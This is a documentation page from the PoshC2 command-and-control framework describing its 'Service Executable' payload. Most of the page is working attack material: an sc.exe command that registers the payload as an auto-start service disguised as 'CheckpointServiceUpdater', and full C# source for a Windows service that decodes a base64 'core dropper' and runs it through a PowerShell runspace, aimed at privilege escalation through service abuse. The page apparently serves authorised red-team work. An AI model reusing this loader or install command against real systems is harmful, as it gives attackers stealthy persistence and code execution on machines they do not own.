

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>Service Executable &mdash; PoshC2 Framework  documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="PoshC2 Framework  documentation" href="../index.html"/>
        <link rel="up" title="Execution / Payloads" href="index.html"/>
        <link rel="next" title="LNK File" href="lnk.html"/>
        <link rel="prev" title="Stand Alone Executable" href="exe.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> PoshC2 Framework
          

          
          </a>

          
            
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../install_and_setup/index.html">Installation &amp; Setup</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="index.html">Execution / Payloads</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="core.html">Core Dropper</a></li>
<li class="toctree-l2"><a class="reference internal" href="bat.html">Bat File</a></li>
<li class="toctree-l2"><a class="reference internal" href="exe.html">Stand Alone Executable</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">Service Executable</a></li>
<li class="toctree-l2"><a class="reference internal" href="lnk.html">LNK File</a></li>
<li class="toctree-l2"><a class="reference internal" href="hta.html">HTA File</a></li>
<li class="toctree-l2"><a class="reference internal" href="macro.html">Macro Documents</a></li>
<li class="toctree-l2"><a class="reference internal" href="ms16-051.html">MS16-051 HTML File</a></li>
<li class="toctree-l2"><a class="reference internal" href="java.html">Java Applet</a></li>
<li class="toctree-l2"><a class="reference internal" href="dll.html">Reflective DLL</a></li>
<li class="toctree-l2"><a class="reference internal" href="shellcode.html">Shellcode</a></li>
<li class="toctree-l2"><a class="reference internal" href="poshjs.html">PoshJS</a></li>
<li class="toctree-l2"><a class="reference internal" href="sctfiles.html">SCT Files</a></li>
<li class="toctree-l2"><a class="reference internal" href="regsvr32.html">RegSvr32</a></li>
<li class="toctree-l2"><a class="reference internal" href="cscript.html">Cscript</a></li>
<li class="toctree-l2"><a class="reference internal" href="mshta.html">Mshta</a></li>
<li class="toctree-l2"><a class="reference internal" href="certutil.html">Certutil</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../core/index.html">Core Implant / Features</a></li>
<li class="toctree-l1"><a class="reference internal" href="../persistence/index.html">Persistence</a></li>
<li class="toctree-l1"><a class="reference internal" href="../modules/index.html">Modules</a></li>
<li class="toctree-l1"><a class="reference internal" href="../lateral_movement/index.html">Lateral Movement</a></li>
<li class="toctree-l1"><a class="reference internal" href="../reporting/index.html">Reporting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../license/index.html">License</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">PoshC2 Framework</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="index.html">Execution / Payloads</a> &raquo;</li>
        
      <li>Service Executable</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/execution/serviceexe.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="service-executable">
<h1>Service Executable<a class="headerlink" href="#service-executable" title="Permalink to this headline">Â¶</a></h1>
<p>Mitre ATT&amp;CK - <a class="reference external" href="https://attack.mitre.org/wiki/Technique/T1050">New Service</a></p>
<p>The following C# code creates the service executable used in PoshC2, where escalation of privileges via service abuse is possible. The code creates a new Powershell Runspace using the System.Management.Automation.dll (v2.0.50727) that is supplied with the project. This executable is not signed and cannot be called directly, instead it must be installed and run via the Windows Service Control Manager. To add a service on the command line use the following command:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">sc</span><span class="o">.</span><span class="n">exe</span> <span class="n">create</span> <span class="n">CPUpdater</span> <span class="n">binpath</span><span class="o">=</span> <span class="s1">&#39;C:\Temp\PoshService.exe&quot; Displayname= CheckpointServiceUpdater start= auto</span>
</pre></div>
</div>
<p>C# Code:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">ServiceProcess</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Collections</span><span class="o">.</span><span class="n">ObjectModel</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Management</span><span class="o">.</span><span class="n">Automation</span><span class="p">;</span>
<span class="n">using</span> <span class="n">System</span><span class="o">.</span><span class="n">Management</span><span class="o">.</span><span class="n">Automation</span><span class="o">.</span><span class="n">Runspaces</span><span class="p">;</span>


<span class="n">namespace</span> <span class="n">Service</span>
<span class="p">{</span>
    <span class="n">static</span> <span class="k">class</span> <span class="nc">Program</span>
    <span class="p">{</span>
        <span class="n">static</span> <span class="n">void</span> <span class="n">Main</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="n">ServiceBase</span><span class="p">[]</span> <span class="n">ServicesToRun</span><span class="p">;</span>
            <span class="n">ServicesToRun</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ServiceBase</span><span class="p">[]</span>
            <span class="p">{</span>
                <span class="n">new</span> <span class="n">Service1</span><span class="p">()</span>
            <span class="p">};</span>
            <span class="n">ServiceBase</span><span class="o">.</span><span class="n">Run</span><span class="p">(</span><span class="n">ServicesToRun</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">public</span> <span class="n">partial</span> <span class="k">class</span> <span class="nc">Service1</span> <span class="p">:</span> <span class="n">ServiceBase</span>
    <span class="p">{</span>
        <span class="n">public</span> <span class="n">static</span> <span class="n">string</span> <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">string</span> <span class="n">cmd</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">Runspace</span> <span class="n">newrunspace</span> <span class="o">=</span> <span class="n">RunspaceFactory</span><span class="o">.</span><span class="n">CreateRunspace</span><span class="p">();</span>
            <span class="n">newrunspace</span><span class="o">.</span><span class="n">Open</span><span class="p">();</span>
            <span class="n">RunspaceInvoke</span> <span class="n">scriptInvoker</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RunspaceInvoke</span><span class="p">(</span><span class="n">newrunspace</span><span class="p">);</span>
            <span class="n">Pipeline</span> <span class="n">pipeline</span> <span class="o">=</span> <span class="n">newrunspace</span><span class="o">.</span><span class="n">CreatePipeline</span><span class="p">();</span>

            <span class="n">pipeline</span><span class="o">.</span><span class="n">Commands</span><span class="o">.</span><span class="n">AddScript</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
            <span class="n">Collection</span><span class="o">&lt;</span><span class="n">PSObject</span><span class="o">&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">pipeline</span><span class="o">.</span><span class="n">Invoke</span><span class="p">();</span>
            <span class="n">newrunspace</span><span class="o">.</span><span class="n">Close</span><span class="p">();</span>

            <span class="n">StringBuilder</span> <span class="n">stringBuilder</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuilder</span><span class="p">();</span>
            <span class="n">foreach</span> <span class="p">(</span><span class="n">PSObject</span> <span class="n">obj</span> <span class="ow">in</span> <span class="n">results</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">stringBuilder</span><span class="o">.</span><span class="n">Append</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">stringBuilder</span><span class="o">.</span><span class="n">ToString</span><span class="p">()</span><span class="o">.</span><span class="n">Trim</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="n">protected</span> <span class="n">override</span> <span class="n">void</span> <span class="n">OnStart</span><span class="p">(</span><span class="n">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">try</span>
            <span class="p">{</span>
                <span class="n">string</span> <span class="n">tt</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">Unicode</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">Convert</span><span class="o">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">&quot;&lt;base64 encoded core dropper&gt;&quot;</span><span class="p">));</span>
                <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">tt</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="n">catch</span> <span class="p">(</span><span class="n">ArgumentException</span> <span class="n">e</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="n">string</span> <span class="n">tt</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="n">Text</span><span class="o">.</span><span class="n">Encoding</span><span class="o">.</span><span class="n">Unicode</span><span class="o">.</span><span class="n">GetString</span><span class="p">(</span><span class="n">System</span><span class="o">.</span><span class="n">Convert</span><span class="o">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s2">&quot;&lt;base64 encoded core dropper&gt;&quot;</span><span class="p">));</span>
                <span class="n">InvokeAutomation</span><span class="p">(</span><span class="n">tt</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="n">protected</span> <span class="n">override</span> <span class="n">void</span> <span class="n">OnStop</span><span class="p">()</span>
        <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="lnk.html" class="btn btn-neutral float-right" title="LNK File" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="exe.html" class="btn btn-neutral" title="Stand Alone Executable" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2018, Nettitude.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>